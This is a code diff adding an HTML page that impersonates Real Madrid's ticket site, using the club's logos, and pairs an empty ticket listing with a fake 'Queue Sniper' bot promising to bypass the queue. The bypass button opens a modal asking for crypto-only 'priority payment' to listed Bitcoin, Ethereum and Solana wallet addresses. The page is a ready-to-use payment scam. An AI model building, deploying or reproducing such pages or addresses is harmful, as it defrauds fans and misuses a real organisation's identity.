@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entradas | Real Madrid CF</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Libre+Franklin:wght@300;400;700;900&display=swap');
+        body { font-family: 'Libre+Franklin', sans-serif; background-color: #f8f9fa; color: #111b33; margin: 0; }
+        .rm-blue { color: #111b33; }
+        .bot-overlay { background: rgba(17, 27, 51, 0.95); border: 1px solid #3b50b6; box-shadow: 0 0 20px rgba(59, 80, 182, 0.4); }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3b50b6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #crypto-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+        .address-box { background: #f0f2f5; border: 1px solid #ddd; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 12px; word-break: break-all; margin-top: 5px; color: #333; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <header class="bg-white border-b border-gray-200 px-4 py-3 flex justify-between items-center sticky top-0 z-50">
+        <div class="flex items-center space-x-4">
+            <img src="https://publish-p33712-e119301.adobeaemcloud.com/adobe/dynamicmedia/deliver/dm-aid--839b0d68-1582-41f9-9689-53e70d428989/logo.svg" alt="Real Madrid" class="h-10">
+            <img src="https://www.realmadrid.com/StaticFiles/RealMadridResponsive/images/header/logo-champions-15.svg" alt="UCL 15" class="h-8">
+        </div>
+        <div class="border border-rm-blue text-rm-blue px-4 py-1.5 rounded-lg font-bold text-sm">Acceder</div>
+    </header>
+
+    <main class="flex-grow p-4 md:max-w-xl md:mx-auto w-full">
+        <h1 class="text-3xl font-black rm-blue italic uppercase tracking-tighter mb-6">Entradas</h1>
+
+        <div class="bg-white rounded-3xl shadow-sm p-12 flex flex-col items-center text-center border border-gray-100 mb-6">
+            <img src="https://www.realmadrid.com/StaticFiles/RealMadridResponsive/images/tickets/no-tickets.svg" alt="Empty" class="w-32 h-32 mb-6">
+            <h2 class="text-xl font-bold rm-blue mb-2">No hay entradas con los filtros o fechas seleccionados</h2>
+            <p class="text-gray-500 text-sm">Prueba a modificar la selección</p>
+        </div>
+
+        <div class="bot-overlay rounded-2xl p-5 text-white">
+            <div class="flex justify-between items-center mb-4 text-blue-400 font-bold text-xs uppercase">
+                <span>Queue Sniper v4.2 Active</span>
+                <div class="loader"></div>
+            </div>
+            <div id="status-text" class="text-sm mb-4">¡CONEXIÓN ESTABLECIDA! <span class="text-green-400 font-bold">Listo para saltar cola.</span></div>
+            <div class="w-full bg-gray-700 h-1.5 rounded-full mb-6">
+                <div class="bg-blue-500 h-full w-full rounded-full"></div>
+            </div>
+            <button onclick="document.getElementById('crypto-modal').style.display='flex'" class="w-full bg-[#3b50b6] py-4 rounded-xl font-bold uppercase tracking-widest text-sm">ENTRAR AHORA (BYPASS)</button>
+        </div>
+    </main>
+
+    <div id="crypto-modal">
+        <div class="bg-white rounded-3xl w-full max-w-md p-6">
+            <h3 class="text-xl font-bold rm-blue mb-2">Pago de Prioridad</h3>
+            <p class="text-xs text-gray-500 mb-6">Solo se aceptan pagos en Cripto para bypass inmediato.</p>
+            
+            <div class="mb-4">
+                <label class="text-[10px] font-bold text-gray-400 uppercase">BTC (Bitcoin)</label>
+                <div class="address-box">bc1qt7zlwlmamph8vt4d0dwdjjnq8yehgvjr6883va</div>
+            </div>
+
+            <div class="mb-4">
+                <label class="text-[10px] font-bold text-gray-400 uppercase">ETH / USDT / USDC (ERC-20)</label>
+                <div class="address-box">0x04065cCfbbcccaD53102B98ADE0e0644E088367C</div>
+            </div>
+
+            <div class="mb-6">
+                <label class="text-[10px] font-bold text-gray-400 uppercase">SOL (Solana)</label>
+                <div class="address-box">37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH</div>
+            </div>
+
+            <button onclick="document.getElementById('crypto-modal').style.display='none'" class="w-full py-3 bg-gray-100 rounded-xl font-bold text-gray-600">Cerrar</button>
+        </div>
+    </div>
+
+</body>
+</html>
